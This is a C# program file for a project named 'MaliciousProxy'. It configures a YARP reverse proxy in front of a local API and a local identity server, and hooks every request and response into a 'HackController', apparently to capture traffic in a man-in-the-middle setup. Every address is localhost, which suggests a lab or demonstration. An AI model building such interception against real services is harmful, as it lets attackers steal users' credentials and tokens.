using MaliciousProxy.Controllers;
using System.Text;
using Yarp.ReverseProxy.Configuration;
using Yarp.ReverseProxy.Transforms;
using Yarp.ReverseProxy.Transforms.Builder;

namespace MaliciousProxy;

public class Program
{
    public static void Main(string[] args)
    {
        var builder = WebApplication.CreateBuilder(args);

        // Add services to the container.

        builder.Services.AddControllers();

        builder.Services.AddReverseProxy()
            .LoadFromMemory(new RouteConfig[]
            {
                new()
                {
                    RouteId = "apiRequests",
                    ClusterId = "apiCluster",
                    Match = new RouteMatch
                    {
                        Hosts = new[] { "localhost:7274" },
                        Path = "{**all}"
                    }
                },
                new()
                {
                    RouteId = "identity",
                    ClusterId = "identityCluster",
                    Match = new RouteMatch
                    {
                        Hosts = new[] { "localhost:5001" },
                        Path = "{**all}"
                    }
                }
            }, new ClusterConfig[]
            {
                new()
                {
                    ClusterId = "apiCluster",
                    Destinations = new Dictionary<string, DestinationConfig>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "apiHost", new DestinationConfig { Address = "https://localhost:7275" } },
                    }
                },
                new()
                {
                    ClusterId = "identityCluster",
                    Destinations = new Dictionary<string, DestinationConfig>(StringComparer.OrdinalIgnoreCase)
                    {
                        { "identityHost", new DestinationConfig { Address = "https://localhost:5002" } },
                    }
                }
            }).AddTransforms(builderContext =>
            {
                builderContext.AddRequestTransform(async context =>
                {
                    HttpRequest request = context.HttpContext.Request;
                    await HackController.AddRequest(request);

                    request.Headers.Remove("Host");
                    request.Headers.Add("Host", new Uri(context.DestinationPrefix).Authority);
                });
                builderContext.AddResponseTransform(async context =>
                {
                    var response = context.ProxyResponse;
                    await HackController.AddResponse(response);
                });
            });

        var app = builder.Build();

        // Configure the HTTP request pipeline.

        app.UseHttpsRedirection();

        app.UseAuthorization();

        app.MapReverseProxy();

        app.MapControllers();

        app.Run();
    }
}
